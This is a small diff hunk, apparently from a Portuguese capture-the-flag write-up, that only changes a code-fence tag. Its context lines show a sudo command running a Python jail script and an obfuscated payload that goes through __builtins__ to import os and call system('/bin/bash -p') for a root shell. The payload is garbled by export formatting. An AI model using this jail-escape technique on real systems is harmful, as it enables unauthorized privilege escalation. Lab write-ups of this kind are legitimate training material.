@@ -100,7 +100,7 @@ Sabemos que temos de alguma forma bypassar a restrição de palavras do script p
 
 - Comandos: `sudo /usr/bin/python3 /home/kamishiro/jail.py`
 
-```python3
+```python
 **__builtins__**.__**dict__**['__**IMPORT__**'.lower()](https://www.notion.so/'OS'.lower()).__**dict__**['SYSTEM'.lower()]('/bin/bash -p')
 ```
 
